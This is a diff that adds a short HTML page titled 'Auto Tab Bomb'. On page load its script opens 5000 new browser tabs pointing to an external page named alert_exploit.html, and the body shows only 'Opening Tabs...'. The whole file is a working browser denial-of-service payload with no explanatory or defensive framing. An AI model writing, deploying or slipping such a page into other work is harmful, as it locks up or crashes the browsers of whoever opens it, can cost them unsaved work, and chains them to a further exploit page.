@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auto Tab Bomb</title>
+  <script>
+    function openMultipleTabs() {
+      const url = "https://lbstyle.github.io/alert_exploit.html"; 
+      for (let i = 0; i < 5000; i++) {
+        window.open(url, '_blank');
+      }
+    }
+
+    window.onload = openMultipleTabs; // runs immediately on page load
+  </script>
+</head>
+<body>
+  <h1>Opening Tabs...</h1>
+</body>
+</html>
